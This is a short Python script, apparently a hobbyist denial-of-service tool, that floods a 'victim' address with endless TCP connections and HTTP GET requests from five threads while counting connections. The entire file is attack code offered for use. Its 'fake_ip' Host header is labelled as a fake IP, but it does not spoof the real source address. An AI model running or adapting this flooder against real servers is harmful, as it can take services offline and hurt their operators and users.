import threading
import socket 

# python doesnt have real multithreading
# use a different languaje

target = '127.0.0.1' # victim's IP adress
port = 5500 # free port
fake_ip = '182.21.20.32' # my fake ip

connections = 0

# attack method
def attack():
  while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'),(target, port))
    s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'),(target, port))
    s.close()

    global connections # see the connections
    connections += 1
    print(f'Conexiones: {connections}')

# multithreading
for i in range(5):
  thread = threading.Thread(target=attack)
  thread.start()